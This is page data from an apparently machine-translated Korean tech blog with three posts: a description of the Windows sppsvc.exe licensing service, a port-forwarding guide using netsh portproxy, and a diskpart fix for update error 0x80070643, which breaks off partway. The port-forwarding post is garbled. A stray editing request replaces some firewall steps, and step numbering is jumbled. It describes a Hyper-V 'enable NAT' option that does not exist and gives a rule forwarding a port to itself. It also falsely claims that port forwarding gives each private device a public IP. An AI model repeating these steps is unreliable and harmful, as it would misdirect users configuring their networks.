{"pageProps":{"posts":[{"title":"윈도우 프로세스 여행 - sppsvcexe 마이크로소프트 소프트웨어 보호 플랫폼 서비스","description":"","date":"2024-05-23 15:28","slug":"2024-05-23-TheWindowsProcessJourneysppsvcexeMicrosoftSoftwareProtectionPlatformService","content":"\n\"sppsvc.exe\" (Microsoft Software Protection Platform Service)은 \"%windir%\\System32\\sppsvc.exe\"에 위치한 PE 이진 파일입니다. Windows의 64비트 버전에서는 \"cmd.exe\"와 같은 다른 이진 파일과 달리 실행 파일의 32비트 버전이 없습니다 (https://medium.com/@boutnaru/the-windows-process-journey-cmd-exe-windows-command-processor-501be17ba81b). 또한, \"sppsvc.exe\" 이진 파일은 Microsoft에 의해 디지털 서명되었습니다.\n\n전반적으로 \"sppsvc.exe\"는 \"Software Protection\" 서비스 (aka sppsvc)의 주요 이미지입니다. 서비스 설명에는 다음과 같이 명시되어 있습니다: \"Windows 및 Windows 애플리케이션의 디지털 라이선스 다운로드, 설치 및 강제 적용을 가능하게 합니다. 서비스가 비활성화되면 운영 체제 및 라이센스가 부여된 애플리케이션이 알림 모드에서 실행될 수 있습니다. 소프트웨어 보호 서비스를 비활성화하지 않는 것이 강력히 권장되며”. 이 서비스는 \"Network Service\" (https://medium.com/@boutnaru/the-windows-security-jorueny-network-service-nt-authority-network-service-e8706688e383) 사용자의 권한/권한으로 실행됩니다 — 아래 스크린 샷에서 확인할 수 있습니다.\n\n따라서, \"sppsvc.exe\"가 다음과 같은 기능을 수행한다고 말할 수 있습니다. Windows 운영 체제가 정품이고 제대로 활성화되었는지를 보장합니다. 주기적으로 Windows 라이선스가 여전히 유효한지 (그리고 취소되지 않았는지) 확인합니다. 또한, 새 Windows 사본을 설치하거나 컴퓨터에 중요한 하드웨어 변경을 수행할 때 활성화 프로세스를 처리합니다. 또한, 시스템의 활성 상태에 대한 익명 데이터를 Microsoft에 수집하고 전송할 수도 있다는 것을 알아야 합니다 (https://malwaretips.com/blogs/microsoft-software-protection-platform-service/).\n\n마지막으로, 활성화 토큰을 보관하는 \"“%windir%\\System32\\spp\\” 디렉토리가 있습니다 (https://community.spiceworks.com/t/windows-10-repeatedly-deactivates/681310). 이 디렉토리에서 파일을 백업하여 Office와 같은 다른 소프트웨어 제공을 다시 활성화할 수 있습니다 (https://community.citrix.com/forums/topic/230472-layered-image-office-2016-will-not-activate-on-first-boot/).\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n다음 글에서 뵙겠습니다 ;-) 트위터에서 저를 팔로우할 수 있어요 — @boutnaru (https://twitter.com/boutnaru). 또한, 저의 다른 글들은 미디엄에서 읽을 수 있어요 — https://medium.com/@boutnaru. 무료 eBook은 https://TheLearningJourneyEbooks.com에서 찾을 수 있어요.\n\n![image](/assets/img/2024-05-23-TheWindowsProcessJourneysppsvcexeMicrosoftSoftwareProtectionPlatformService_0.png)\n","ogImage":{"url":"/assets/img/2024-05-23-TheWindowsProcessJourneysppsvcexeMicrosoftSoftwareProtectionPlatformService_0.png"},"coverImage":"/assets/img/2024-05-23-TheWindowsProcessJourneysppsvcexeMicrosoftSoftwareProtectionPlatformService_0.png","tag":["Tech"],"readingTime":3},{"title":"윈도우에서의 포트 포워딩 및 설정 방법들","description":"","date":"2024-05-23 15:26","slug":"2024-05-23-PortForwardinginWindowsandWaystoSetitUp","content":"\nWindows에서 원격 액세스 또는 서버 호스팅을 위해 포트 포워딩 설정하는 방법을 배워보세요. 지금 당신의 장치에서 이를 활성화하고 구성하는 방법에 대한 가이드를 따르세요.\n\n![포트 포워딩 이미지](/assets/img/2024-05-23-PortForwardinginWindowsandWaystoSetitUp_0.png)\n\n본문에서 읽을 내용 목록:\n\n1. Windows에서의 포트 포워딩이란?\n2. 포트 포워딩이 작동하는 방식은?\n3. 포트 포워딩에 대한 명령 프롬프트 사용\n4. Windows 방화벽을 위한 포트 포워딩 구성\n5. Hyper-V 가상 스위치에서 NAT 규칙을 사용한 포트 포워딩\n6. Windows에서 Netsh 포트 포워딩 규칙 관리\n7. 결론\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n포트 포워딩은 네트워크의 보안 및 기능성을 제고하는 데 사용되는 기본적인 기술 중 하나입니다. 이는 네트워크 라우터를 구성하여 특정 포트로부터 오는 들어오는 트래픽을 네트워크 내의 지정된 장치로 전달하는 과정을 말합니다. Windows 환경에서 포트 포워딩을 설정하는 것은 기술적 지식이 제한된 사람들에게는 도전적일 수 있습니다. 하지만 올바른 지식과 도구를 활용하면 누구나 빠르게 포트 포워딩을 설정할 수 있습니다. 이 가이드에서는 Windows에서 포트 포워딩을 설정하는 단계와 그에 필요한 도구 및 기술에 대해 살펴보겠습니다.\n\n# Windows에서 포트 포워딩이란?\n\n포트 포워딩은 컴퓨터 및 기타 네트워크 장치가 인터넷과 통신할 수 있게 해주는 필수적인 네트워킹 기술입니다. 이는 로컬 네트워크 외부에서 인터넷에 접근해야 하는 장치, 서비스 또는 프로그램에 필요한 과정입니다. 포트 포워딩은 네트워크 외부의 특정 포트에서 네트워크 내의 특정 포트로 네트워크 트래픽을 라우팅함으로써 작동합니다. 기본적으로, 네트워크 라우터는 인터넷으로부터 들어오는 트래픽을 차단하도록 설계되어 있어 서버, 게임 콘솔 및 기타 네트워크 장치에서 문제가 발생할 수 있습니다.\n\n사용자가 네트워크의 장치에 연결을 시작하면 라우터가 요청을 받아 해당 장치로 전달합니다. 그러나 포트 포워딩이 없으면 라우터는 어떤 장치가 트래픽을 받아야 하는지 알 수 없어 연결이 실패합니다. 따라서 포트 포워딩은 특정 서비스, 장치 및 애플리케이션이 올바르게 작동하고 로컬 네트워크 외부의 인터넷에 접근할 수 있도록 하는 데 중요합니다.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n# 포트 포워딩은 어떻게 작동하나요?\n\n포트 포워딩은 네트워크 외부의 특정 포트로부터 들어오는 트래픽을 네트워크 내의 특정 장치나 서비스로 리디렉션하는 방식으로 작동합니다. 이 과정은 라우터를 구성하여 네트워크 내의 특정 장치나 서비스로 특정 포트를 포워딩하는 것을 포함합니다. 외부 네트워크에서 연결 요청이 발생하면, 라우터가 해당 요청을 수신하고 요청에서 사용된 특정 포트 번호를 확인합니다. 그런 다음, 라우터는 포트 포워딩 규칙을 확인하여 요청을 수신할 장치나 서비스를 결정합니다. 규칙이 발견되면, 라우터는 포트 포워딩 구성에 따라 들어오는 트래픽을 지정된 장치나 서비스로 전달합니다.\n\n포트 포워딩은 복잡할 수 있지만, 적절한 지식과 도구를 활용하면 빠르고 쉽게 수행할 수 있습니다. 라우터에서 포트 포워딩을 구성하려면 라우터의 구성 인터페이스에 대한 지식, 각 서비스에 필요한 특정 포트 번호, 그리고 인터넷을 통해 접근해야 하는 네트워크 내 장치의 IP 주소에 대한 지식이 필요합니다.\n\n# 명령 프롬프트를 사용한 포트 포워딩\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n윈도우에서 포트 포워딩을 위해 명령 프롬프트를 사용하는 방법에 대한 단계별 안내서입니다:\n\n## 단계 1: 명령 프롬프트 열기\n\n시작 메뉴를 클릭하고 검색 필드에 “cmd”를 입력한 후 Enter 키를 눌러주세요. 그러면 명령 프롬프트 창이 열립니다.\n\n## 단계 2: 장치의 IP 주소 얻기\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n명령 프롬프트 창에 \"ipconfig\"을 입력하고 Enter 키를 누르세요. 네트워크 어댑터 아래의 \"IPv4 주소\"를 찾아 IP 주소를 메모해 두세요.\n\n## 단계 3: 포트 포워딩 규칙 생성\n\n다음 명령을 입력하고 Enter 키를 누르세요:\n\nnetsh interface portproxy add v4tov4 listenport=8080 listenaddress=192.168.1.10 connectport=8080 connectaddress=192.168.1.10\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n## 단계 4: 포트 포워딩 규칙 확인하기\n\n다음 명령을 입력하고 Enter 키를 눌러주세요:\n\nnetsh interface portproxy show all\n\n이 명령은 현재 네트워크에서 활성화된 모든 포트 포워딩 규칙의 목록을 표시합니다. 만들었던 규칙이 나열되어 있는지 확인해보세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n## 단계 5: 명령 프롬프트 닫기\n\n\"exit\"을 입력하고 Enter 키를 눌러 명령 프롬프트 창을 닫습니다.\n\n그것이죠! 이제 Windows에서 포트 포워딩을 위해 명령 프롬프트를 성공적으로 사용했습니다.\n\n# 포트 포워딩을 위한 Windows 방화벽 구성\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n다음은 포트 포워딩을 위한 Windows 방화벽 구성 방법에 대한 단계별 가이드입니다:\n\n## 단계 1: Windows 방화벽 설정 열기\n\n시작 메뉴를 클릭하고 검색란에 \"방화벽\"을 입력한 후 \"Windows Defender 방화벽\"을 선택합니다.\n\n## 단계 2: \"고급 설정\"을 클릭하세요\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n치트 시트 태그를 마크다운 형식으로 수정해주세요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n\"Port\"을 선택하고 \"다음\"을 클릭하세요.\n\n## 단계 5: 포트 구성\n\n구성해야 할 포트 유형을 선택하세요: TCP 또는 UDP. \"구체적 로컬 포트\" 필드에 전달할 포트 번호를 입력하세요.\n\n## 단계 6: 작업 선택\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n“연결 허용”을 선택하고 “다음”을 클릭하세요.\n\n## 단계 7: 프로필 선택\n\n규칙을 적용할 프로필을 선택하고(Domain, Private, Public) “다음”을 클릭하세요.\n\n## 단계 8: 규칙의 이름 지정 및 저장\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n**단계 9: 규칙 확인**\n\n규칙에 이름을 지정하고 \"완료\"를 클릭하세요.\n\n# Hyper-V 가상 스위치에서 포트 포워딩을 위한 NAT 규칙 사용하기\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n안녕하세요! Hyper-V Virtual Switch에서 NAT 규칙으로 포트 포워딩하는 방법에 대한 단계별 안내서입니다:\n\n## 단계 1: Hyper-V 매니저 열기\n\n시작 메뉴를 클릭하고 검색 필드에 \"Hyper-V 매니저\"를 입력한 후 결과에서 \"Hyper-V 매니저\"를 선택합니다.\n\n## 단계 2: 가상 스위치 생성\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n하이퍼-V 관리자 창의 오른쪽 사이드바에서 \"가상 스위치 관리자\"를 클릭하세요. \"새 가상 네트워크 스위치\"를 클릭하고 가상 스위치 유형으로 \"내부\" 또는 \"개인\"을 선택하세요.\n\n## 단계 3: 가상 스위치 구성\n\n가상 스위치에 이름을 지어 네트워크 어댑터 설정을 구성하세요. \"관리 운영 체제가이 네트워크 어댑터를 공유하도록 허용\" 옵션이 선택 해제되어 있는지 확인하세요.\n\n## 단계 4: 새 가상 머신을 만들거나 기존 머신을 선택하세요\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n하이퍼-V 관리자 창에서 가상 머신을 마우스 오른쪽 단추로 클릭하고 \"설정\"을 선택하세요.\n\n## 단계 5: 네트워크 어댑터 추가\n\n\"Add Hardware\"를 클릭하고 \"네트워크 어댑터\"를 선택하여 가상 머신에 네트워크 어댑터를 추가하세요.\n\n## 단계 6: 가상 스위치에 연결\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n### 단계 7: NAT 서브 스위치 활성화\n\nHyper-V 관리자 창에서 단계 2에서 생성한 가상 스위치를 마우스 오른쪽 버튼으로 클릭하고 \"속성\"을 선택합니다. \"NAT 활성화\" 옵션을 선택하고 \"OK\"를 클릭합니다.\n\n### 단계 8: NAT 규칙 생성\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n가상 머신에서 \"Windows 키 + R\"을 눌러 명령 프롬프트를 열고, 실행 대화상자에 \"cmd\"를 입력하여 실행하세요. 다음 명령어를 입력하여 NAT 규칙을 생성하세요:\n\n```plaintext\nnetsh interface portproxy add v4tov4 listenport=80 listenaddress=0.0.0.0 connectport=8080 connectaddress=192.168.1.10\n```\n\n포워딩할 포트 번호로 \"80\"을, 포트를 전달할 장치의 IP 주소로 \"192.168.1.10\"을 대체하세요.\n\n## 단계 9: NAT 규칙 확인\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n다음 명령을 입력하여 NAT 규칙을 확인하세요:\n\nnetsh interface portproxy show all\n\n모든 NAT 규칙을 나열해줄 것입니다.\n\n# 윈도우에서 Netsh 포트 포워딩 규칙 관리\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n윈도우에서 Netsh 포트 포워딩 규칙을 관리하는 단계별 가이드입니다:\n\n## 단계 1: 명령 프롬프트 열기\n\n시작 메뉴를 클릭하고 검색 필드에 \"cmd\"를 입력한 다음 \"명령 프롬프트\"를 선택하세요.\n\n## 단계 2: 기존 포트 포워딩 규칙 확인\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n\"netsh interface portproxy show all\"을 입력하고 Enter 키를 누르세요. 이렇게 하면 현재 모든 포트 포워딩 규칙 목록이 표시됩니다.\n\n## 단계 3: 포트 포워딩 규칙 추가\n\n새 포트 포워딩 규칙을 추가하려면 다음을 입력하세요:\n\n\"netsh interface portproxy add v4tov4 listenport= listenaddress= connectport= connectaddress=\"\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n## 단계 4: 포트 포워딩 규칙 삭제\n\n기존의 포트 포워딩 규칙을 삭제하려면 다음을 입력하세요:\n\n`netsh interface portproxy delete v4tov4 listenport= listenaddress=`\n\n## 단계 5: 기존의 포트 포워딩 규칙 수정\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n기존 포트 포워딩 규칙을 수정하려면 해당 규칙을 삭제하고 원하는 변경 사항이 적용된 새로운 규칙을 추가하면 됩니다.\n\n## 단계 6: 포트 포워딩 규칙 비활성화\n\n기존 포트 포워딩 규칙을 비활성화하려면 다음을 입력하세요:\n\n“netsh interface portproxy delete v4tov4 listenport= listenaddress=”\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n## 단계 7: 비활성화된 포트 포워딩 규칙 활성화\n\n비활성화된 포트 포워딩 규칙을 활성화하려면 다음을 입력하여 규칙을 다시 추가하세요:\n\n“netsh interface portproxy add v4tov4 listenport= listenaddress= connectport= connectaddress=”\n\n# 결론\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n- 포트 포워딩은 네트워킹 기술로, 방화벽이나 라우터를 통해 공용 네트워크에서 사설 네트워크로 트래픽을 전달하는 것을 가능하게 합니다. 이 기술을 사용하면 가정 네트워크에 원격으로 접속하여 서버를 호스팅할 수 있습니다.\n- 포트 포워딩은 공용 IP 주소를 각 사설 네트워크 장치에 할당하여, 방화벽에서 차단되는 대신 특정 장치로 들어오는 트래픽을 직접 전달합니다.\n- Windows 운영 체제에는 포트 포워딩 설정을 구성할 수 있는 내장 도구가 포함되어 있습니다. Windows 방화벽과 인터넷 연결 공유(ICS) 기능 등이 이에 해당합니다. 이러한 도구를 사용하면 포트 포워딩 및 수신 트래픽을 받아들일 장치나 응용 프로그램을 명시하는 규칙을 만들 수 있습니다.\n\n#Price를 위한 더 많은 도구가 있습니다\n\nhttps://t.me/redfishiaven\n\n#업데이트 #튜토리얼 #리아뉴스 #소프트웨어 #하드웨어 #기술 #돈 #수익 #IPMC #사랑 #이벤트 #컴퓨팅 #컴퓨터 #정보기술 #학습 #인공지능 #redfishiaven #서버 #딥웹 #다크웹 #비트코인\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n구글 맵스에서 REDFISH IA VEN (https://goo.gl/maps/LVKkEYNN2LTe9C34A)을 확인해보세요.\n\nhttps://www.youtube.com/channel/UC6k_cFigPCSEtRyALo1D-tA\n\n새로운 소프트웨어에 대한 최초 정보를 받아보세요! #software\n","ogImage":{"url":"/assets/img/2024-05-23-PortForwardinginWindowsandWaystoSetitUp_0.png"},"coverImage":"/assets/img/2024-05-23-PortForwardinginWindowsandWaystoSetitUp_0.png","tag":["Tech"],"readingTime":13},{"title":"윈도우 서버 2022에 KB5034439을 설치하려고 할 때 발생하는 0x80070643 오류 해결 방법","description":"","date":"2024-05-23 15:25","slug":"2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022","content":"\n안녕하세요, 지난주 발생한 문제에 대해 이야기하려고 해요.\n\nWindows Server 2022에서 Windows 업데이트를 확인했을 때 다음과 같은 오류가 있었어요:\n\n![에러 이미지](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_0.png)\n\n그리고 KB5034439를 설치하는 동안 오류가 발생했음을 확인했는데, 해결해야 할 여러 제안이 있었지만 문제를 해결하지 못했어요.\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n그리고 마침내 그 문제를 해결할 수 있는 올바른 참조를 찾았어요. 이제 아래 단계를 따라주세요.\n\n# 복구 파티션을 수동으로 크기 조정하기\n\n- 관리자 권한으로 명령 프롬프트 창(cmd)을 엽니다.\n\n![이미지](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_1.png)\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n2. WinRE가 설치된 경우, WinRE 디렉토리 경로가 있는 \"Windows RE 위치\"가 있어야 합니다. WinRE 상태를 확인하려면 reagentc /info를 실행하세요. 예시: \"Windows RE 위치:\n\n\\\\?\\GLOBALROOT\\device\\harddisk0\\partition4\\Recovery\\WindowsRE\n\n![이미지](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_2.png)\n\n3. WinRE 비활성화를 위해 reagentc /disable를 실행하세요\"\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n![Error Screenshot](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_3.png)\n\n4. Shrink the OS partition and prepare the disk for a new recovery partition.\n   a. To shrink the OS, run diskpart\n\n![Error Screenshot](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_4.png)\n\nb. Run list disk\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n![Error message](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_5.png)\n\nc. To select the OS disk, run `sel disk OS disk index`. This should be the same disk index as WinRE.\n\n![Error message](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_6.png)\n\nd. To check the partition under the OS disk and find the OS partition, run `list part`\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n![Error Image 1](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_7.png)\n\ne. To select the OS partition, run `sel part OS partition index`\n\n![Error Image 2](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_8.png)\n\nf. Run `shrink desired=250 minimum=250`\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n![Error Screenshot 9](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_9.png)\n\ng. To select the WinRE partition, run `sel part WinRE partition index`\n\n![Error Screenshot 10](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_10.png)\n\nh. To delete the WinRE partition, run `delete partition override`\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n![이미지](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_11.png)\n\n5. 새 복구 파티션을 생성합니다.\n\na. 먼저, 디스크 파티션 스타일이 GUID Partition Table (GPT) 또는 Master Boot Record (MBR)인지 확인합니다. 이를 확인하려면 list disk를 실행합니다. \"Gpt\" 열에 별표(_)가 있는지 확인합니다. 별표(_)가 있는 경우 드라이브가 GPT이고, 그렇지 않으면 MBR입니다.\n\n![이미지](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_12.png)\n\n<!-- ui-station 사각형 -->\n\n<ins class=\"adsbygoogle\"\nstyle=\"display:block\"\ndata-ad-client=\"ca-pub-4877378276818686\"\ndata-ad-slot=\"7249294152\"\ndata-ad-format=\"auto\"\ndata-full-width-responsive=\"true\"></ins>\n\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n\n1. GPT 디스크인 경우, create partition primary id=de94bba4-06d1-4d40-a16a-bfd50179d6ac 명령을 실행한 다음 gpt attributes =0x8000000000000001 명령을 실행하세요.\n\n![image](/assets/img/2024-05-23-Error0x80070643wheninstallingKB5034439onWindowsServer2022_13.png)\n\n2. MBR 디스크인 경우, create partition primary id=27 명령을 실행하세요.\n\n3. 파티션을 포맷하려면, format quick fs=ntfs label=\"Windows RE tools\" 